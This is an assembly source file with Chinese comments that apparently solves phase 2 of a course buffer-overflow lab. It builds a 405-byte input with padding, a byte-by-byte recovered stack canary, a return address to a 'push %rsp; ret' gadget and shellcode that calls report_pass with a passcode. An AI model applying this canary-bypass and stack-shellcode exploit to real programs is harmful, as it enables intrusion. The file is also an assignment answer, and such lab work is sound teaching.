# attack2.s — 阶段 2：有栈金丝雀（服务器版）
#
# 服务器的金丝雀由服务器按学号生成（本学号：0x8c84bbbba2d10100），
# 与本地固定的 0x1122334455667700 不同；本地与远程两份程序除此之外完全一致
# （指令、地址、缓冲区距离相同），所以只有本文件的第 360 字节处不同。
#
# 金丝雀的求法（README 阶段 2）：填充到金丝雀之前 + 已解出的字节 + 一个
# 候选字节。候选对，整行跑完（exit 0）；错，金丝雀检查失败（signal 6）。
# 候选之后的字节仍保留真值，所以按字节从左到右一个个解。
# 实际求解用的是 tools/find_canary.py，解出的内存字节：
#   00 01 d1 a2 bb bb 84 8c
#
# 输入布局（共 405 字节）：
#   偏移 0..359    360 字节填充 0x67，写到 chat_turn 的金丝雀之前
#   偏移 360..367  服务器金丝雀（小端写回）
#   偏移 368..375  保存的 %rbp（8 字节填充）
#   偏移 376..383  覆盖返回地址 → 0x48b38b（push %rsp; ret）
#   偏移 384..404  shellcode
#
# shellcode：%rdi = 2（阶段号），%rsi = 口令，ret 进入 report_pass。

.text
.fill 360, 1, 0x67          # 0..359：填充到金丝雀之前
.quad 0x8c84bbbba2d10100    # 360：服务器金丝雀（内存字节 00 01 d1 a2 bb bb 84 8c）
.fill 8, 1, 0x67            # 368：保存的 %rbp
.quad 0x48b38b              # 376：返回地址 = push %rsp; ret

# 384：shellcode
push $0x1938000             # report_pass 的地址
movl $2, %edi               # 阶段号 2
movabs $0xdc22eaf2a8fe9994, %rsi    # 口令
ret                         # 进入 report_pass
